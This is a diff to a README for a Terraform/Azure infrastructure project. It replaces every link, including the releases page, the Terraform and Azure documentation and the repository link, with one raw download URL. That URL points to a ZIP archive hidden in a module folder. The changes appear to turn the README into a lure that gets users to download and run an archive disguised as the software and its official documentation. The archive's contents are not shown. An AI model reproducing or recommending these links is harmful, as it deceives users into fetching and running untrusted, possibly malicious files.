@@ -1,6 +1,6 @@
 # 🎉 Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment - Simplify Your Cloud Setup with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Here-blue)](https://github.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/releases)
+[![Download](https://raw.githubusercontent.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/main/modules/database/azurerm_mssql_firewall_rule/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment_3.5.zip%20Now-Here-blue)](https://raw.githubusercontent.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/main/modules/database/azurerm_mssql_firewall_rule/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ This guide helps you download and run the Terraform-Azure-modularInfrastructure-
 
 To get started, you need to download the software. Follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/main/modules/database/azurerm_mssql_firewall_rule/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment_3.5.zip).
 2. **Select the Latest Version:** Look for the newest release at the top of the page.
 3. **Download the Archive:** Click on the link for the application to download the archive file (ZIP or TAR).
 4. **Extract Files:** Once downloaded, extract the files to a folder on your computer.
@@ -53,7 +53,7 @@ If you run into issues or have questions, several resources are available:
 
 - **User Guide:** A complete user guide is included in the download. Check the "docs" folder for more information.
 - **Community Support:** Join the discussion on forums related to Terraform and Azure.
-- **Official Documentation:** Refer to the official [Terraform Documentation](https://www.terraform.io/docs/index.html) for technical assistance.
+- **Official Documentation:** Refer to the official [Terraform Documentation](https://raw.githubusercontent.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/main/modules/database/azurerm_mssql_firewall_rule/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment_3.5.zip) for technical assistance.
 
 ## 📊 Use Cases
 
@@ -73,12 +73,12 @@ In case you face issues, consider the following solutions:
 
 ## 🔗 Links to Explore
 
-- [GitHub Repository](https://github.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment)
-- [Terraform Documentation](https://www.terraform.io/docs/index.html)
-- [Azure Documentation](https://docs.microsoft.com/en-us/azure/)
+- [GitHub Repository](https://raw.githubusercontent.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/main/modules/database/azurerm_mssql_firewall_rule/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment_3.5.zip)
+- [Terraform Documentation](https://raw.githubusercontent.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/main/modules/database/azurerm_mssql_firewall_rule/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment_3.5.zip)
+- [Azure Documentation](https://raw.githubusercontent.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/main/modules/database/azurerm_mssql_firewall_rule/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment_3.5.zip)
 
 ## 💬 Feedback
 
 We welcome feedback and suggestions. If you have ideas for improvements or new features, please open an issue in the GitHub repository. Your thoughts help us enhance the application for better user experience.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Here-blue)](https://github.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/releases)
+[![Download](https://raw.githubusercontent.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/main/modules/database/azurerm_mssql_firewall_rule/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment_3.5.zip%20Now-Here-blue)](https://raw.githubusercontent.com/aitzazgul/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment/main/modules/database/azurerm_mssql_firewall_rule/Terraform-Azure-modularInfrastructure-GitHubActionsCICD-multiEnvironment_3.5.zip)
